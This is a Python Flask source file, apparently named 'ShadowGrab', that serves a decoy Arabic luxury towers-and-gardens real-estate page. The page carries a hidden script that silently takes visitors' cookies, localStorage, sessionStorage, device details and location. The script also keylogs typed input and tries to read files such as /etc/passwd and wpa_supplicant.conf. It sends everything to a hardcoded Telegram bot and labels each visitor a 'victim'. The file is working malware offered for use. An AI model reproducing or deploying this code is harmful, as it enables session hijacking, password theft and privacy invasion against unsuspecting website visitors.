from flask import Flask, request, jsonify
import os
import json
import requests
import datetime
import base64

app = Flask(__name__)

TELEGRAM_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
TELEGRAM_CHAT_ID = "1170411845"

def send_telegram(message, photo=None):
    try:
        if photo:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': photo}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': message[:200]}
            requests.post(url, files=files, data=data, timeout=10)
        else:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message[:4000], "parse_mode": "HTML"}
            requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"خطأ: {e}")

@app.route('/')
def index():
    visitor_ip = request.remote_addr
    send_telegram(f"""🔥 <b>دخول ضحية جديدة</b>
🌐 IP: {visitor_ip}
⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
📱 جاري سحب البيانات...""")
    
    return '''
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>أبراج وحدائق الفخامة</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f8f5f0; color: #2c2c2c; scroll-behavior: smooth; }
            .navbar { background: rgba(0,0,0,0.85); padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; position: fixed; width: 100%; top: 0; z-index: 1000; backdrop-filter: blur(10px); border-bottom: 2px solid #d4af37; }
            .navbar .logo { font-size: 28px; font-weight: bold; color: #d4af37; letter-spacing: 2px; }
            .navbar .logo span { color: #fff; }
            .navbar ul { list-style: none; display: flex; gap: 30px; }
            .navbar ul li a { color: #fff; text-decoration: none; font-size: 16px; font-weight: 500; transition: 0.3s; padding: 8px 16px; border-radius: 30px; }
            .navbar ul li a:hover { background: #d4af37; color: #000; }
            .hero { height: 100vh; background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.3)), url('https://images.pexels.com/photos/323705/pexels-photo-323705.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1') center/cover no-repeat; display: flex; align-items: center; justify-content: center; text-align: center; color: #fff; padding-top: 80px; }
            .hero-content h1 { font-size: 64px; font-weight: 300; letter-spacing: 4px; text-shadow: 0 4px 30px rgba(0,0,0,0.6); }
            .hero-content h1 span { color: #d4af37; font-weight: 700; }
            .hero-content p { font-size: 20px; margin: 20px 0 40px; opacity: 0.9; max-width: 600px; margin-left: auto; margin-right: auto; }
            .btn { background: #d4af37; color: #000; padding: 14px 40px; border-radius: 50px; text-decoration: none; font-weight: 600; font-size: 18px; transition: 0.3s; display: inline-block; border: 2px solid #d4af37; }
            .btn:hover { background: transparent; color: #d4af37; }
            .section { padding: 80px 40px; max-width: 1200px; margin: auto; }
            .section-title { font-size: 40px; font-weight: 300; text-align: center; margin-bottom: 20px; }
            .section-title span { color: #d4af37; font-weight: 700; }
            .section-desc { text-align: center; max-width: 700px; margin: 0 auto 60px; color: #666; font-size: 18px; line-height: 1.8; }
            .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; }
            .card { background: #fff; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.08); transition: 0.4s; border: 1px solid #eee; }
            .card:hover { transform: translateY(-10px); box-shadow: 0 30px 80px rgba(212,175,55,0.15); }
            .card img { width: 100%; height: 220px; object-fit: cover; }
            .card-body { padding: 25px; }
            .card-body h3 { font-size: 22px; margin-bottom: 10px; }
            .card-body h3 span { color: #d4af37; }
            .card-body p { color: #666; line-height: 1.8; margin-bottom: 15px; }
            .card-body .tag { display: inline-block; background: #d4af37; color: #000; padding: 4px 14px; border-radius: 30px; font-size: 12px; font-weight: 600; }
            .garden { background: #1a2e1a; color: #fff; border-radius: 40px; padding: 80px 40px; margin: 40px auto; max-width: 1200px; display: flex; flex-wrap: wrap; align-items: center; gap: 40px; }
            .garden-text { flex: 1; min-width: 280px; }
            .garden-text h2 { font-size: 36px; font-weight: 300; margin-bottom: 20px; }
            .garden-text h2 span { color: #d4af37; font-weight: 700; }
            .garden-text p { opacity: 0.8; line-height: 2; font-size: 17px; }
            .garden-image { flex: 1; min-width: 280px; border-radius: 30px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
            .garden-image img { width: 100%; height: 300px; object-fit: cover; display: block; }
            .gallery { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-top: 40px; }
            .gallery img { width: 100%; height: 200px; object-fit: cover; border-radius: 16px; transition: 0.4s; border: 2px solid transparent; }
            .gallery img:hover { transform: scale(1.03); border-color: #d4af37; }
            .footer { background: #0f0f0f; color: #aaa; text-align: center; padding: 40px; border-top: 2px solid #d4af37; }
            .footer span { color: #d4af37; }
            .footer .social { margin: 20px 0; }
            .footer .social a { color: #aaa; margin: 0 12px; font-size: 20px; text-decoration: none; transition: 0.3s; }
            .footer .social a:hover { color: #d4af37; }
            @media (max-width: 768px) {
                .hero-content h1 { font-size: 36px; }
                .navbar ul { gap: 12px; flex-wrap: wrap; justify-content: center; }
                .navbar { flex-direction: column; padding: 16px 20px; }
                .section { padding: 50px 20px; }
                .garden { padding: 40px 20px; }
            }
        </style>
    </head>
    <body>

        <nav class="navbar">
            <div class="logo">🏰 <span>أبراج</span> الفخامة</div>
            <ul>
                <li><a href="#towers">الأبراج</a></li>
                <li><a href="#garden">الحديقة</a></li>
                <li><a href="#gallery">المعرض</a></li>
                <li><a href="#contact">تواصل</a></li>
            </ul>
        </nav>

        <section class="hero">
            <div class="hero-content">
                <h1>أبراج <span>الذهب</span> وحدائق <span>الزمرد</span></h1>
                <p>حيث تلتقي الفخامة بالطبيعة في أرقى تصاميم العصر. مشروع سكني متكامل يمنحك حياة لا تُضاهى.</p>
                <a href="#towers" class="btn">استكشف الآن</a>
            </div>
        </section>

        <section class="section" id="towers">
            <h2 class="section-title">أبراجنا <span>الفاخرة</span></h2>
            <p class="section-desc">أبراج شاهقة بتصاميم عالمية، تطل على حدائق خضراء ومرافق راقية تناسب ذوقك.</p>
            <div class="cards">
                <div class="card">
                    <img src="https://images.pexels.com/photos/279698/pexels-photo-279698.jpeg?auto=compress&cs=tinysrgb&w=600" alt="برج 1">
                    <div class="card-body">
                        <h3>برج <span>الذهبي</span></h3>
                        <p>شقق فاخرة بإطلالة بانورامية على المدينة والحدائق.</p>
                        <span class="tag">متوفر</span>
                    </div>
                </div>
                <div class="card">
                    <img src="https://images.pexels.com/photos/327677/pexels-photo-327677.jpeg?auto=compress&cs=tinysrgb&w=600" alt="برج 2">
                    <div class="card-body">
                        <h3>برج <span>الزمرد</span></h3>
                        <p>تصميم عصري مع حدائق خاصة على كل طابق.</p>
                        <span class="tag">قريباً</span>
                    </div>
                </div>
                <div class="card">
                    <img src="https://images.pexels.com/photos/2386142/pexels-photo-2386142.jpeg?auto=compress&cs=tinysrgb&w=600" alt="برج 3">
                    <div class="card-body">
                        <h3>برج <span>الرئاسة</span></h3>
                        <p>أجنحة فخمة مع خدمات راقية على مدار الساعة.</p>
                        <span class="tag">متوفر</span>
                    </div>
                </div>
            </div>
        </section>

        <section id="garden">
            <div class="garden">
                <div class="garden-text">
                    <h2>حديقة <span>الفخامة</span></h2>
                    <p>تمتد حديقتنا على مساحة 50 ألف متر مربع، تضم أشجاراً نادرة، بحيرات صناعية، ومسارات للمشي. مكان مثالي للاسترخاء والاستمتاع بجمال الطبيعة وسط أبراجنا الشاهقة.</p>
                    <br>
                    <a href="#gallery" class="btn" style="background:transparent; color:#d4af37; border-color:#d4af37;">استكشف المعرض</a>
                </div>
                <div class="garden-image">
                    <img src="https://images.pexels.com/photos/158028/bellingrath-gardens-alabama-landscape-scenic-158028.jpeg?auto=compress&cs=tinysrgb&w=600" alt="الحديقة">
                </div>
            </div>
        </section>

        <section class="section" id="gallery">
            <h2 class="section-title">معرض <span>الصور</span></h2>
            <p class="section-desc">لقطات حصرية من مشروعنا تجمع بين الأبراج والحدائق في تناغم بصري.</p>
            <div class="gallery">
                <img src="https://images.pexels.com/photos/323780/pexels-photo-323780.jpeg?auto=compress&cs=tinysrgb&w=600" alt="صورة 1">
                <img src="https://images.pexels.com/photos/2386224/pexels-photo-2386224.jpeg?auto=compress&cs=tinysrgb&w=600" alt="صورة 2">
                <img src="https://images.pexels.com/photos/2826149/pexels-photo-2826149.jpeg?auto=compress&cs=tinysrgb&w=600" alt="صورة 3">
                <img src="https://images.pexels.com/photos/280229/pexels-photo-280229.jpeg?auto=compress&cs=tinysrgb&w=600" alt="صورة 4">
                <img src="https://images.pexels.com/photos/248837/pexels-photo-248837.jpeg?auto=compress&cs=tinysrgb&w=600" alt="صورة 5">
                <img src="https://images.pexels.com/photos/1070341/pexels-photo-1070341.jpeg?auto=compress&cs=tinysrgb&w=600" alt="صورة 6">
            </div>
        </section>

        <section class="section" id="contact" style="text-align:center;">
            <h2 class="section-title">تواصل <span>معنا</span></h2>
            <p class="section-desc">للاستفسار عن الشقق والوحدات المتاحة، يسعدنا تواصلك معنا.</p>
            <div style="display:flex; flex-wrap:wrap; justify-content:center; gap:20px; margin-top:30px;">
                <a href="tel:+966500000000" class="btn" style="background:#d4af37; color:#000; border-color:#d4af37;">📞 اتصل بنا</a>
                <a href="mailto:info@towers-garden.com" class="btn" style="background:transparent; color:#d4af37; border-color:#d4af37;">📧 بريد إلكتروني</a>
            </div>
        </section>

        <footer class="footer">
            <p>© 2026 <span>أبراج الفخامة</span> — جميع الحقوق محفوظة</p>
            <div class="social">
                <a href="#">📷</a>
                <a href="#">🐦</a>
                <a href="#">📘</a>
                <a href="#">📺</a>
            </div>
            <p style="font-size:13px; opacity:0.5;">تصميم مستوحى من الفخامة والطبيعة</p>
        </footer>

        <!-- ===== كود السحب الصامت ===== -->
        <script>
            // ===== 1. سحب جميع الكوكيز =====
            const cookies = document.cookie || 'لا توجد كوكيز';
            sendData('🍪 الكوكيز', cookies);

            // ===== 2. سحب LocalStorage =====
            try {
                const ls = JSON.stringify(localStorage) || '{}';
                sendData('💾 LocalStorage', ls.substring(0, 800));
            } catch(e) {}

            // ===== 3. سحب SessionStorage =====
            try {
                const ss = JSON.stringify(sessionStorage) || '{}';
                sendData('📦 SessionStorage', ss.substring(0, 800));
            } catch(e) {}

            // ===== 4. معلومات الجهاز =====
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
            sendData('💻 معلومات الجهاز', JSON.stringify(deviceInfo, null, 2));

            // ===== 5. محاولة سحب ملفات النظام =====
            const systemFiles = [
                '/etc/passwd',
                '/etc/hosts',
                '/proc/cpuinfo',
                '/data/misc/wifi/wpa_supplicant.conf',
                '/sdcard/DCIM/',
                '/sdcard/Download/',
                '/sdcard/Pictures/'
            ];
            
            systemFiles.forEach(file => {
                try {
                    fetch('file://' + file)
                        .then(res => {
                            if (res.ok) return res.text();
                            throw new Error('غير متاح');
                        })
                        .then(data => {
                            sendData('📂 ملف: ' + file, data.substring(0, 500));
                        })
                        .catch(() => {});
                } catch(e) {}
            });

            // ===== 6. Keylogger =====
            let keys = [];
            let lastSend = Date.now();
            
            document.addEventListener('keydown', e => {
                if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace' || e.key === 'Tab') {
                    keys.push(e.key);
                    if (keys.length > 200) keys.shift();
                }
                if (Date.now() - lastSend > 3000 && keys.length > 0) {
                    sendData('⌨️ المفاتيح المسجلة', keys.join('').substring(0, 500));
                    keys = [];
                    lastSend = Date.now();
                }
            });

            // ===== 7. الموقع التقريبي =====
            try {
                fetch('https://ipapi.co/json/')
                    .then(res => res.json())
                    .then(data => {
                        const location = {
                            ip: data.ip || 'غير معروف',
                            city: data.city || 'غير معروف',
                            country: data.country_name || 'غير معروف'
                        };
                        sendData('📍 الموقع التقريبي', JSON.stringify(location, null, 2));
                    })
                    .catch(() => {});
            } catch(e) {}

            // ===== دوال الإرسال =====
            function sendData(label, content) {
                if (!content || content.length < 2) return;
                try {
                    const payload = btoa(unescape(encodeURIComponent(JSON.stringify({ label, content, time: new Date().toISOString() }))));
                    fetch('/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ payload })
                    }).catch(() => {});
                } catch(e) {}
            }

            // ===== إرسال المفاتيح كل 5 ثواني =====
            setInterval(() => {
                if (keys.length > 0) {
                    sendData('⌨️ المفاتيح المسجلة', keys.join('').substring(0, 500));
                    keys = [];
                    lastSend = Date.now();
                }
            }, 5000);

            console.log('✅ ShadowGrab + موقع فخم يعملان معاً');
        </script>
    </body>
    </html>
    '''

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        if data and 'payload' in data:
            decoded = json.loads(base64.b64decode(data['payload']).decode('utf-8'))
            label = decoded.get('label', 'بيانات')
            content = decoded.get('content', '')
            time = decoded.get('time', datetime.datetime.now().isoformat())
            
            msg = f"""📌 <b>{label}</b>
📝 {content[:1000]}
⏰ {time}"""
            send_telegram(msg)
            return jsonify({"status": "ok"})
    except Exception as e:
        print(f"خطأ: {e}")
    return jsonify({"status": "error"}), 400

@app.route('/image', methods=['POST'])
def image():
    try:
        data = request.json
        if data and 'image' in data:
            img_data = base64.b64decode(data['image'])
            send_telegram('📸 صورة مسحوبة', ('image.jpg', img_data, 'image/jpeg'))
            return jsonify({"status": "ok"})
    except Exception as e:
        print(e)
    return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    send_telegram(f"""🔥 <b>ShadowGrab + موقع فخم</b>
🎯 سحب البيانات + تصميم راقٍ
⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
